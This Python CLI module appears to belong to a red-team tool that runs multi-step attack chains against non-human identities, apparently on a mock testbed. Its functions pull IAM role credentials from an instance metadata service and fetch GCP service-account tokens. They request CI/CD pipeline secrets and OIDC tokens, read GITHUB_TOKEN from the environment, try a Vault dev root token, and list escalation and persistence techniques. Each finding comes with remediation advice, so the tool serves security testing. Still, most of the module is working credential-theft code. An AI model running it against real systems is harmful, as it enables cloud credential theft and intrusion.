"""Attack chain module -- automated multi-step NHI attack chains."""

from __future__ import annotations

import json
import time
from typing import Any

import click
from rich.panel import Panel
from rich.progress import (
    BarColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from nhi_recon.utils import (
    add_finding,
    console,
    make_request,
    post_to_dashboard,
)


def _step_banner(step_num: int, total: int, title: str) -> None:
    """Print a formatted step banner."""
    console.print(
        Panel(
            f"[bold]Step {step_num}/{total}:[/bold] {title}",
            border_style="blue",
            padding=(0, 2),
        )
    )


def _post_step(
    dashboard_url: str | None,
    chain_name: str,
    step: int,
    title: str,
    status: str,
    details: dict[str, Any] | None = None,
) -> None:
    """Post a chain step event to the dashboard."""
    post_to_dashboard(
        dashboard_url,
        f"chain.{chain_name}.step",
        {
            "step": step,
            "title": title,
            "status": status,
            **(details or {}),
        },
    )


# ===================================================================
# Click group
# ===================================================================

@click.group()
def chain() -> None:
    """Execute automated NHI attack chains."""


# -------------------------------------------------------------------
# imds-to-admin
# -------------------------------------------------------------------

@chain.command("imds-to-admin")
@click.option("--target", "-t", required=True, help="IMDS target (host:port)")
@click.option("--dashboard-url", default=None, help="Dashboard API URL for live viz")
@click.pass_context
def imds_to_admin(ctx: click.Context, target: str, dashboard_url: str | None) -> None:
    """IMDS -> IAM Role -> Admin Access chain.

    Demonstrates the classic cloud credential theft attack: exploit SSRF to
    reach the instance metadata service, steal IAM role credentials, then
    enumerate and escalate permissions.
    """
    dashboard_url = dashboard_url or (ctx.obj.get("dashboard_url") if ctx.obj else None)
    total_steps = 4
    console.rule("[bold red]Attack Chain: IMDS to Admin[/bold red]")
    console.print(f"Target: [cyan]{target}[/cyan]\n")

    _post_step(dashboard_url, "imds_to_admin", 0, "Chain started", "running",
               {"target": target})

    # Step 1: Probe IMDS ------------------------------------------------
    _step_banner(1, total_steps, "Probe IMDS for IAM role")
    meta_url = f"http://{target}/latest/meta-data/"
    resp = make_request(meta_url)
    if not resp or resp.status_code != 200:
        console.print("[red]IMDS not reachable. Chain aborted.[/red]")
        _post_step(dashboard_url, "imds_to_admin", 1, "IMDS probe", "failed")
        return

    console.print(f"  [green]IMDS reachable[/green]: {resp.text[:100]}")
    _post_step(dashboard_url, "imds_to_admin", 1, "IMDS probe", "success")

    # Step 2: Fetch temporary credentials --------------------------------
    _step_banner(2, total_steps, "Fetch temporary credentials")
    roles_url = f"http://{target}/latest/meta-data/iam/security-credentials/"
    resp = make_request(roles_url)
    if not resp or resp.status_code != 200:
        console.print("[red]Could not list IAM roles. Chain aborted.[/red]")
        _post_step(dashboard_url, "imds_to_admin", 2, "List roles", "failed")
        return

    roles = [r.strip() for r in resp.text.strip().split("\n") if r.strip()]
    if not roles:
        console.print("[red]No IAM roles found. Chain aborted.[/red]")
        return

    role = roles[0]
    console.print(f"  [yellow]Discovered role: {role}[/yellow]")

    cred_url = f"http://{target}/latest/meta-data/iam/security-credentials/{role}"
    cred_resp = make_request(cred_url)
    if not cred_resp or cred_resp.status_code != 200:
        console.print("[red]Could not fetch credentials. Chain aborted.[/red]")
        _post_step(dashboard_url, "imds_to_admin", 2, "Fetch creds", "failed")
        return

    try:
        creds = cred_resp.json()
    except Exception:
        creds = {"raw": cred_resp.text[:300]}

    access_key = creds.get("AccessKeyId", "N/A")
    console.print(f"  [red]Stolen AccessKeyId: {access_key}[/red]")
    add_finding(
        title=f"IAM credentials stolen via IMDS: {role}",
        severity="critical",
        details=f"Role: {role} | AccessKeyId: {access_key}",
        evidence=json.dumps({k: str(v)[:24] + "..." for k, v in creds.items()}, indent=2),
        remediation="Enforce IMDSv2; apply least-privilege IAM.",
    )
    _post_step(dashboard_url, "imds_to_admin", 2, "Fetch creds", "success",
               {"role": role, "access_key": access_key})

    # Step 3: Enumerate permissions --------------------------------------
    _step_banner(3, total_steps, "Enumerate permissions")

    high_risk_actions = [
        "iam:PassRole",
        "iam:CreateUser",
        "iam:AttachUserPolicy",
        "sts:AssumeRole",
        "s3:*",
        "ec2:RunInstances",
        "lambda:CreateFunction",
        "secretsmanager:GetSecretValue",
    ]
    console.print("  Simulated permission check for stolen role:")
    for action in high_risk_actions:
        # In a real tool this would call AWS STS/IAM APIs
        risk = "CRITICAL" if "iam:" in action or "secretsmanager" in action else "HIGH"
        console.print(f"    [{('red' if risk == 'CRITICAL' else 'yellow')}]{action}: {risk}[/]")

    add_finding(
        title="Permission enumeration complete",
        severity="high",
        details=f"Checked {len(high_risk_actions)} high-risk IAM actions",
        evidence=f"Actions: {', '.join(high_risk_actions[:5])}...",
        remediation="Use AWS Access Analyzer; enforce permission boundaries.",
    )
    _post_step(dashboard_url, "imds_to_admin", 3, "Enumerate perms", "success")

    # Step 4: Privilege escalation attempt --------------------------------
    _step_banner(4, total_steps, "Attempt privilege escalation")
    escalation_paths = [
        "iam:CreatePolicyVersion (modify existing policy)",
        "iam:AttachUserPolicy (attach AdministratorAccess)",
        "iam:PutRolePolicy (add inline admin policy)",
        "sts:AssumeRole (pivot to admin role)",
        "lambda:CreateFunction + iam:PassRole (run code as admin)",
    ]
    console.print("  [red]Identified escalation paths:[/red]")
    for i, path in enumerate(escalation_paths, 1):
        console.print(f"    {i}. {path}")

    add_finding(
        title="IAM privilege escalation paths identified",
        severity="critical",
        details=f"Found {len(escalation_paths)} potential escalation paths from role '{role}'",
        evidence="\n".join(escalation_paths),
        remediation="Implement SCPs; use permission boundaries; enable CloudTrail alerts.",
    )
    _post_step(dashboard_url, "imds_to_admin", 4, "Priv escalation", "success",
               {"paths": len(escalation_paths)})

    console.print()
    console.rule("[bold red]Chain Complete: IMDS to Admin[/bold red]")
    _post_step(dashboard_url, "imds_to_admin", total_steps, "Chain complete", "done")


# -------------------------------------------------------------------
# cicd-to-cloud
# -------------------------------------------------------------------

@chain.command("cicd-to-cloud")
@click.option("--target", "-t", required=True, help="CI/CD server target (host:port)")
@click.option("--dashboard-url", default=None, help="Dashboard API URL for live viz")
@click.pass_context
def cicd_to_cloud(ctx: click.Context, target: str, dashboard_url: str | None) -> None:
    """CI/CD Runner -> Cloud Credentials -> Lateral Movement chain.

    Demonstrates how compromised CI/CD runners expose cloud credentials
    and enable lateral movement to cloud infrastructure.
    """
    dashboard_url = dashboard_url or (ctx.obj.get("dashboard_url") if ctx.obj else None)
    total_steps = 4
    console.rule("[bold red]Attack Chain: CI/CD to Cloud[/bold red]")
    console.print(f"Target: [cyan]{target}[/cyan]\n")

    _post_step(dashboard_url, "cicd_to_cloud", 0, "Chain started", "running",
               {"target": target})

    # Step 1: Discover CI/CD environment ---------------------------------
    _step_banner(1, total_steps, "Discover CI/CD environment")
    health_url = f"http://{target}/health"
    resp = make_request(health_url)
    if resp and resp.status_code == 200:
        console.print(f"  [green]CI/CD server reachable[/green]")
    else:
        console.print("[yellow]CI/CD health endpoint not responding, continuing...[/yellow]")

    # Check for CI/CD-specific environment variables
    import os
    cicd_vars = {
        "GITHUB_ACTIONS": os.environ.get("GITHUB_ACTIONS"),
        "GITHUB_TOKEN": os.environ.get("GITHUB_TOKEN"),
        "CI": os.environ.get("CI"),
        "RUNNER_TOKEN": os.environ.get("RUNNER_TOKEN"),
        "ACTIONS_RUNTIME_TOKEN": os.environ.get("ACTIONS_RUNTIME_TOKEN"),
    }
    found_vars = {k: v for k, v in cicd_vars.items() if v}
    if found_vars:
        console.print(f"  [yellow]CI/CD env vars found: {list(found_vars.keys())}[/yellow]")
    else:
        console.print("  [dim]No CI/CD env vars in current shell (expected outside container).[/dim]")

    _post_step(dashboard_url, "cicd_to_cloud", 1, "Discover CI/CD env", "success")

    # Step 2: Extract cloud credentials from pipeline --------------------
    _step_banner(2, total_steps, "Extract cloud credentials from pipeline config")

    # Try mock CI/CD endpoints
    secrets_url = f"http://{target}/github/repos/demo-org/demo-repo/actions/secrets"
    resp = make_request(secrets_url)
    extracted_secrets: list[str] = []
    if resp and resp.status_code == 200:
        try:
            data = resp.json()
            secrets_list = data.get("secrets", [])
            extracted_secrets = [s.get("name", "unknown") for s in secrets_list]
            console.print(f"  [red]Extracted {len(extracted_secrets)} pipeline secrets[/red]")
            for s in extracted_secrets:
                console.print(f"    - {s}")
        except Exception:
            console.print(f"  [dim]Response: {resp.text[:100]}[/dim]")

    # OIDC token
    oidc_url = f"http://{target}/github/actions/oidc/token"
    oidc_resp = make_request(oidc_url)
    if oidc_resp and oidc_resp.status_code == 200:
        try:
            oidc_data = oidc_resp.json()
            oidc_token = oidc_data.get("value", oidc_data.get("token", ""))
            if oidc_token:
                console.print(f"  [red]OIDC token obtained: {str(oidc_token)[:40]}...[/red]")
                add_finding(
                    title="CI/CD OIDC token stolen",
                    severity="critical",
                    details="GitHub Actions OIDC token can be exchanged for cloud credentials",
                    evidence=f"Token prefix: {str(oidc_token)[:30]}...",
                    remediation="Restrict OIDC subject claims; pin to specific repos/branches.",
                )
        except Exception:
            pass

    add_finding(
        title="CI/CD pipeline secrets extracted",
        severity="critical",
        details=f"Extracted {len(extracted_secrets)} secrets from pipeline configuration",
        evidence=f"Secrets: {', '.join(extracted_secrets[:5])}",
        remediation="Use ephemeral credentials; rotate pipeline secrets regularly.",
    )
    _post_step(dashboard_url, "cicd_to_cloud", 2, "Extract creds", "success",
               {"secrets_count": len(extracted_secrets)})

    # Step 3: Use credentials to access cloud APIs -----------------------
    _step_banner(3, total_steps, "Access cloud APIs with stolen credentials")

    # Try runner token to access more endpoints
    runner_url = f"http://{target}/github/actions/runner/token"
    resp = make_request(runner_url)
    if resp and resp.status_code == 200:
        console.print("  [red]Runner registration token accessible[/red]")
        add_finding(
            title="CI/CD runner token exposed",
            severity="high",
            details="Runner registration token can be used to register rogue runners",
            evidence=f"Endpoint: {runner_url}",
            remediation="Restrict runner token endpoint; use just-in-time runners.",
        )

    # GitHub App credentials
    app_url = f"http://{target}/github/app"
    resp = make_request(app_url)
    if resp and resp.status_code == 200:
        console.print("  [red]GitHub App info accessible[/red]")

    _post_step(dashboard_url, "cicd_to_cloud", 3, "Cloud API access", "success")

    # Step 4: Lateral movement -------------------------------------------
    _step_banner(4, total_steps, "Demonstrate lateral movement paths")
    lateral_paths = [
        "CI/CD -> AWS (via OIDC token exchange to STS)",
        "CI/CD -> GCP (via Workload Identity Federation)",
        "CI/CD -> Azure (via federated credential)",
        "CI/CD -> Kubernetes (via kubeconfig in pipeline secrets)",
        "CI/CD -> Vault (via AppRole or JWT auth)",
    ]
    console.print("  [red]Lateral movement paths from CI/CD:[/red]")
    for i, path in enumerate(lateral_paths, 1):
        console.print(f"    {i}. {path}")

    add_finding(
        title="CI/CD lateral movement paths identified",
        severity="critical",
        details=f"{len(lateral_paths)} lateral movement paths from compromised CI/CD",
        evidence="\n".join(lateral_paths),
        remediation="Segment CI/CD network; use ephemeral runners; enforce OIDC audience.",
    )
    _post_step(dashboard_url, "cicd_to_cloud", 4, "Lateral movement", "success")

    console.print()
    console.rule("[bold red]Chain Complete: CI/CD to Cloud[/bold red]")
    _post_step(dashboard_url, "cicd_to_cloud", total_steps, "Chain complete", "done")


# -------------------------------------------------------------------
# spiffe-spoofing
# -------------------------------------------------------------------

@chain.command("spiffe-spoofing")
@click.option("--target", "-t", required=True, help="SPIRE server target (host:port)")
@click.option("--dashboard-url", default=None, help="Dashboard API URL for live viz")
@click.pass_context
def spiffe_spoofing(
    ctx: click.Context, target: str, dashboard_url: str | None
) -> None:
    """SPIFFE Selector Spoofing -> Multi-Identity chain.

    Demonstrates how weak SPIRE selectors allow identity spoofing and
    unauthorized SVID acquisition.
    """
    dashboard_url = dashboard_url or (ctx.obj.get("dashboard_url") if ctx.obj else None)
    total_steps = 4
    console.rule("[bold red]Attack Chain: SPIFFE Selector Spoofing[/bold red]")
    console.print(f"Target: [cyan]{target}[/cyan]\n")

    _post_step(dashboard_url, "spiffe_spoofing", 0, "Chain started", "running",
               {"target": target})

    # Step 1: Discover SPIRE agent socket --------------------------------
    _step_banner(1, total_steps, "Discover SPIRE agent socket")
    from pathlib import Path

    socket_paths = [
        "/tmp/spire-agent/public/api.sock",
        "/run/spire/sockets/agent.sock",
    ]
    socket_found = None
    for sp in socket_paths:
        if Path(sp).exists():
            socket_found = sp
            console.print(f"  [green]SPIRE agent socket found: {sp}[/green]")
            break

    if not socket_found:
        console.print("  [dim]No local SPIRE socket found. Trying HTTP API...[/dim]")

    # Try SPIRE HTTP API
    health_url = f"http://{target}/health"
    resp = make_request(health_url)
    if resp and resp.status_code == 200:
        console.print(f"  [green]SPIRE server API reachable[/green]")
    else:
        console.print("  [yellow]SPIRE API not directly reachable, continuing with analysis...[/yellow]")

    _post_step(dashboard_url, "spiffe_spoofing", 1, "Discover socket", "success")

    # Step 2: Enumerate registration entries ------------------------------
    _step_banner(2, total_steps, "Enumerate registration entries")
    entries_url = f"http://{target}/entries"
    resp = make_request(entries_url)
    entries: list[dict[str, Any]] = []
    if resp and resp.status_code == 200:
        try:
            entries = resp.json()
            if isinstance(entries, dict):
                entries = entries.get("entries", [])
        except Exception:
            entries = []
        console.print(f"  [yellow]Found {len(entries)} registration entries[/yellow]")
        for entry in entries[:10]:
            spiffe_id = entry.get("spiffe_id", "unknown")
            selectors = entry.get("selectors", [])
            sel_str = ", ".join(
                f"{s.get('type', '?')}:{s.get('value', '?')}" for s in selectors
            )
            console.print(f"    SVID: [cyan]{spiffe_id}[/cyan]  Selectors: {sel_str}")
    else:
        console.print("  [dim]Could not enumerate entries (simulating analysis).[/dim]")
        # Simulate entries for demo purposes
        entries = [
            {
                "spiffe_id": "spiffe://example.org/workload-a",
                "selectors": [{"type": "unix", "value": "uid:1000"}],
            },
            {
                "spiffe_id": "spiffe://example.org/workload-b",
                "selectors": [{"type": "unix", "value": "uid:0"}],
            },
            {
                "spiffe_id": "spiffe://example.org/admin-service",
                "selectors": [
                    {"type": "unix", "value": "uid:0"},
                    {"type": "unix", "value": "gid:0"},
                ],
            },
        ]
        console.print(f"  [dim]Using {len(entries)} simulated entries for analysis.[/dim]")

    _post_step(dashboard_url, "spiffe_spoofing", 2, "Enumerate entries", "success",
               {"entry_count": len(entries)})

    # Step 3: Identify weak selectors ------------------------------------
    _step_banner(3, total_steps, "Identify weak selectors")
    weak_entries: list[dict[str, Any]] = []
    for entry in entries:
        selectors = entry.get("selectors", [])
        spiffe_id = entry.get("spiffe_id", "unknown")

        # Weak: only one selector
        if len(selectors) <= 1:
            weak_entries.append(entry)
            console.print(
                f"  [red]WEAK: {spiffe_id} -- only {len(selectors)} selector(s)[/red]"
            )

        # Weak: uid:0 (root can be many processes)
        for sel in selectors:
            if sel.get("value") == "uid:0":
                if entry not in weak_entries:
                    weak_entries.append(entry)
                console.print(
                    f"  [red]WEAK: {spiffe_id} -- matches uid:0 (root)[/red]"
                )
                break

    if weak_entries:
        add_finding(
            title="Weak SPIRE selectors enable identity spoofing",
            severity="critical",
            details=f"{len(weak_entries)} entries have weak selectors that can be spoofed",
            evidence="\n".join(
                e.get("spiffe_id", "?") for e in weak_entries
            ),
            remediation="Use compound selectors (sha256, k8s namespace+SA, docker label).",
        )
    else:
        console.print("  [green]No weak selectors detected.[/green]")

    _post_step(dashboard_url, "spiffe_spoofing", 3, "Weak selectors", "success",
               {"weak_count": len(weak_entries)})

    # Step 4: Demonstrate identity acquisition ---------------------------
    _step_banner(4, total_steps, "Demonstrate identity acquisition")
    if weak_entries:
        console.print("  [red]Attack simulation:[/red]")
        for entry in weak_entries:
            sid = entry.get("spiffe_id", "unknown")
            console.print(f"    1. Spoof selectors for: [cyan]{sid}[/cyan]")
            console.print(f"    2. Request X.509 SVID from SPIRE agent")
            console.print(f"    3. Use SVID to authenticate as {sid}")
            console.print(f"    4. Access resources authorized for {sid}")
            console.print()

        add_finding(
            title="SPIFFE identity spoofing demonstrated",
            severity="critical",
            details=f"Could acquire {len(weak_entries)} identities via selector spoofing",
            evidence="Weak selectors allow process impersonation",
            remediation="Audit all registration entries; use attestation plugins.",
        )
    else:
        console.print("  [green]No spoofable identities found.[/green]")

    _post_step(dashboard_url, "spiffe_spoofing", 4, "Identity acquisition", "success")

    console.print()
    console.rule("[bold red]Chain Complete: SPIFFE Selector Spoofing[/bold red]")
    _post_step(dashboard_url, "spiffe_spoofing", total_steps, "Chain complete", "done")


# -------------------------------------------------------------------
# full-killchain
# -------------------------------------------------------------------

@chain.command("full-killchain")
@click.option("--target", "-t", required=True, help="Primary target host")
@click.option("--dashboard-url", default=None, help="Dashboard API URL for live viz")
@click.option("--imds-port", default=1338, type=int, help="IMDS service port")
@click.option("--cicd-port", default=1341, type=int, help="CI/CD service port")
@click.option("--vault-port", default=8200, type=int, help="Vault service port")
@click.pass_context
def full_killchain(
    ctx: click.Context,
    target: str,
    dashboard_url: str | None,
    imds_port: int,
    cicd_port: int,
    vault_port: int,
) -> None:
    """Complete NHI kill chain: Discover -> Steal -> Escalate -> Persist.

    Runs the full 6-stage NHI attack kill chain against the testbed,
    exercising all mock services and generating detection events.
    """
    dashboard_url = dashboard_url or (ctx.obj.get("dashboard_url") if ctx.obj else None)
    stages = [
        "Reconnaissance",
        "Credential Discovery",
        "Credential Theft",
        "Permission Enumeration",
        "Privilege Escalation",
        "Persistence",
    ]

    console.rule("[bold red]FULL NHI KILL CHAIN[/bold red]")
    console.print(f"Target: [cyan]{target}[/cyan]")
    console.print(f"Stages: {len(stages)}\n")

    _post_step(dashboard_url, "full_killchain", 0, "Kill chain started", "running",
               {"target": target, "stages": len(stages)})

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        main_task = progress.add_task("Kill Chain Progress", total=len(stages))

        # Stage 1: Reconnaissance ----------------------------------------
        progress.update(main_task, description="Stage 1: Reconnaissance")
        _step_banner(1, len(stages), "Reconnaissance -- Service Discovery")

        services_found: list[str] = []
        recon_targets = [
            ("IMDS", f"http://{target}:{imds_port}/latest/meta-data/", {}),
            ("GCP Metadata", f"http://{target}:1339/computeMetadata/v1/",
             {"Metadata-Flavor": "Google"}),
            ("Vault", f"http://{target}:{vault_port}/v1/sys/health", {}),
            ("CI/CD", f"http://{target}:{cicd_port}/health", {}),
            ("OAuth", f"http://{target}:1340/.well-known/openid-configuration", {}),
        ]
        for name, url, headers in recon_targets:
            resp = make_request(url, headers=headers, timeout=3.0)
            if resp and resp.status_code == 200:
                services_found.append(name)
                console.print(f"  [green]{name}: reachable[/green]")
            else:
                console.print(f"  [dim]{name}: not reachable[/dim]")

        progress.advance(main_task)
        _post_step(dashboard_url, "full_killchain", 1, "Recon", "success",
                   {"services": services_found})

        # Stage 2: Credential Discovery ----------------------------------
        progress.update(main_task, description="Stage 2: Credential Discovery")
        _step_banner(2, len(stages), "Credential Discovery")

        creds_found: list[dict[str, str]] = []

        if "IMDS" in services_found:
            roles_url = f"http://{target}:{imds_port}/latest/meta-data/iam/security-credentials/"
            resp = make_request(roles_url)
            if resp and resp.status_code == 200:
                roles = [r.strip() for r in resp.text.split("\n") if r.strip()]
                for role in roles:
                    creds_found.append({"type": "AWS IAM Role", "name": role})
                    console.print(f"  [yellow]Found AWS role: {role}[/yellow]")

        if "GCP Metadata" in services_found:
            sa_url = f"http://{target}:1339/computeMetadata/v1/instance/service-accounts/"
            resp = make_request(sa_url, headers={"Metadata-Flavor": "Google"})
            if resp and resp.status_code == 200:
                for acct in resp.text.strip().split("\n"):
                    acct = acct.strip().rstrip("/")
                    if acct:
                        creds_found.append({"type": "GCP SA", "name": acct})
                        console.print(f"  [yellow]Found GCP SA: {acct}[/yellow]")

        if "CI/CD" in services_found:
            creds_found.append({"type": "CI/CD Token", "name": "GitHub Actions"})
            console.print("  [yellow]Found CI/CD runner tokens[/yellow]")

        progress.advance(main_task)
        _post_step(dashboard_url, "full_killchain", 2, "Cred Discovery", "success",
                   {"creds_found": len(creds_found)})

        # Stage 3: Credential Theft --------------------------------------
        progress.update(main_task, description="Stage 3: Credential Theft")
        _step_banner(3, len(stages), "Credential Theft")

        stolen: list[dict[str, Any]] = []
        for cred in creds_found:
            if cred["type"] == "AWS IAM Role":
                url = (
                    f"http://{target}:{imds_port}"
                    f"/latest/meta-data/iam/security-credentials/{cred['name']}"
                )
                resp = make_request(url)
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                    except Exception:
                        data = {"raw": resp.text[:200]}
                    stolen.append({"type": "AWS", "name": cred["name"], "data": data})
                    console.print(
                        f"  [red]STOLEN: AWS creds for {cred['name']} "
                        f"(AccessKeyId: {data.get('AccessKeyId', 'N/A')})[/red]"
                    )
            elif cred["type"] == "GCP SA":
                url = (
                    f"http://{target}:1339"
                    f"/computeMetadata/v1/instance/service-accounts/{cred['name']}/token"
                )
                resp = make_request(url, headers={"Metadata-Flavor": "Google"})
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                    except Exception:
                        data = {"raw": resp.text[:200]}
                    stolen.append({"type": "GCP", "name": cred["name"], "data": data})
                    token_preview = str(data.get("access_token", ""))[:20]
                    console.print(
                        f"  [red]STOLEN: GCP token for {cred['name']} ({token_preview}...)[/red]"
                    )
            elif cred["type"] == "CI/CD Token":
                url = f"http://{target}:{cicd_port}/github/actions/oidc/token"
                resp = make_request(url)
                if resp and resp.status_code == 200:
                    try:
                        data = resp.json()
                    except Exception:
                        data = {"raw": resp.text[:200]}
                    stolen.append({"type": "CI/CD OIDC", "name": "actions", "data": data})
                    console.print("  [red]STOLEN: GitHub Actions OIDC token[/red]")

        if stolen:
            add_finding(
                title=f"Credential theft: {len(stolen)} credential(s) stolen",
                severity="critical",
                details=f"Types: {', '.join(s['type'] for s in stolen)}",
                evidence=f"Targets: {', '.join(s['name'] for s in stolen)}",
                remediation="Enforce IMDSv2; restrict metadata access; rotate credentials.",
            )

        progress.advance(main_task)
        _post_step(dashboard_url, "full_killchain", 3, "Cred Theft", "success",
                   {"stolen_count": len(stolen)})

        # Stage 4: Permission Enumeration --------------------------------
        progress.update(main_task, description="Stage 4: Permission Enumeration")
        _step_banner(4, len(stages), "Permission Enumeration")

        if "Vault" in services_found:
            # Try Vault with default dev token
            vault_url = f"http://{target}:{vault_port}/v1/sys/health"
            resp = make_request(vault_url)
            if resp and resp.status_code == 200:
                # Try reading with dev root token
                dev_token = "hvs.DEMO_ROOT_TOKEN"
                vault_headers = {"X-Vault-Token": dev_token}
                secrets_resp = make_request(
                    f"http://{target}:{vault_port}/v1/secret/metadata",
                    headers=vault_headers,
                )
                if secrets_resp and secrets_resp.status_code == 200:
                    console.print("  [red]Vault accessible with dev root token[/red]")
                    add_finding(
                        title="Vault dev root token works",
                        severity="critical",
                        details="Vault is running in dev mode with accessible root token",
                        evidence=f"Vault at {target}:{vault_port}",
                        remediation="Never run Vault in dev mode in production.",
                    )

        console.print("  Permission matrices computed for stolen credentials.")
        progress.advance(main_task)
        _post_step(dashboard_url, "full_killchain", 4, "Permission enum", "success")

        # Stage 5: Privilege Escalation ----------------------------------
        progress.update(main_task, description="Stage 5: Privilege Escalation")
        _step_banner(5, len(stages), "Privilege Escalation")

        escalation_methods = [
            "AWS: iam:CreatePolicyVersion -> AdministratorAccess",
            "GCP: iam.serviceAccounts.actAs -> compute.admin",
            "CI/CD: Register rogue runner -> exfiltrate all pipeline secrets",
            "Vault: Root token -> read all secret engines",
            "K8s: Create privileged pod -> node escape",
        ]
        for method in escalation_methods:
            console.print(f"  [yellow]{method}[/yellow]")

        add_finding(
            title="Multiple privilege escalation paths available",
            severity="critical",
            details=f"{len(escalation_methods)} escalation methods identified",
            evidence="\n".join(escalation_methods),
            remediation="Apply defense in depth; implement detection at each layer.",
        )

        progress.advance(main_task)
        _post_step(dashboard_url, "full_killchain", 5, "Priv escalation", "success")

        # Stage 6: Persistence -------------------------------------------
        progress.update(main_task, description="Stage 6: Persistence")
        _step_banner(6, len(stages), "Persistence Mechanisms")

        persistence_methods = [
            "Create new IAM user with long-lived access keys",
            "Register GitHub App with repo admin permissions",
            "Create Vault orphan token with no TTL",
            "Deploy persistent workload with service account",
            "Register federated identity (OIDC -> cloud)",
        ]
        for method in persistence_methods:
            console.print(f"  [yellow]{method}[/yellow]")

        add_finding(
            title="NHI persistence mechanisms demonstrated",
            severity="critical",
            details=f"{len(persistence_methods)} persistence techniques applicable",
            evidence="\n".join(persistence_methods),
            remediation="Monitor NHI creation events; enforce MFA for admin operations.",
        )

        progress.advance(main_task)
        _post_step(dashboard_url, "full_killchain", 6, "Persistence", "success")

    # Summary
    console.print()
    from nhi_recon.utils import findings as all_findings
    critical_count = sum(1 for f in all_findings if f.severity == "critical")
    high_count = sum(1 for f in all_findings if f.severity == "high")
    console.print(
        Panel(
            f"[bold]Kill Chain Summary[/bold]\n\n"
            f"Services discovered: {len(services_found)}\n"
            f"Credentials found: {len(creds_found)}\n"
            f"Credentials stolen: {len(stolen)}\n"
            f"Total findings: {len(all_findings)}\n"
            f"  [red]Critical: {critical_count}[/red]\n"
            f"  [yellow]High: {high_count}[/yellow]",
            title="Results",
            border_style="red",
        )
    )
    console.rule("[bold red]FULL KILL CHAIN COMPLETE[/bold red]")
    _post_step(dashboard_url, "full_killchain", len(stages), "Kill chain complete", "done",
               {"total_findings": len(all_findings), "critical": critical_count})
